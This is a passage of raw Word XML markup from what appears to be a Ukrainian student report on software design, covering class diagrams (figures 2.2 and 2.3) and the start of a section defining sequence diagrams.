          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>також</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>конструювання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> за </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>допомогою</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> прямого </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>або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зворотного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проектування</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rPr>
        <w:t>Діаграма</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>класів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>представлені</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>на</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>малюнку</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.2 і 2.3.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5922645" cy="1990725"/>
            <wp:effectExtent l="0" t="0" r="190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22645" cy="199072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2.2 - головний клас від якого все починається</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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4578985" cy="39109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8985" cy="391096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ab/>
        <w:t>Малюнок 2.3 - класи форм інтерфейсу, реєстрації і результату.</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="__RefHeading___Toc10641140"/>
      <w:bookmarkStart w:id="21" w:name="_Toc10727437"/>
      <w:bookmarkEnd w:id="20"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>2.2.3 Діаграма послідовності</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>діаграма</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>послідовності</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId52" w:history="1">
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:iCs/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>англ.</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sequence</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>diagram</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:hyperlink r:id="rId53" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>діаграма</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, На </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>якій</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>деякого</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> набору </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>об'єктів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> на </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>єдиній</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>тимчасової</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>осі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> показаний </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>життєвий</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> цикл будь-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>якого</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>певного</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>об'єкта</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>створення-діяльність-знищення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>якоїсь</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>сутності</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">) і </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>взаємодія</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>акторів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>дійових</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>осіб</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">) ІС в рамках </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>якої-небудь</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>певної</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> прецеденту (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>відправка</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>запитів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> і </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>отримання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>відповідей</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">) . </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Використовується</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>мові</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText>HYPERLINK</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> "</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText>https</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:instrText>://</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText>ru</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:instrText>.</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText>wikipedia</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:instrText>.</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText>org</w:instrText>
      </w:r>
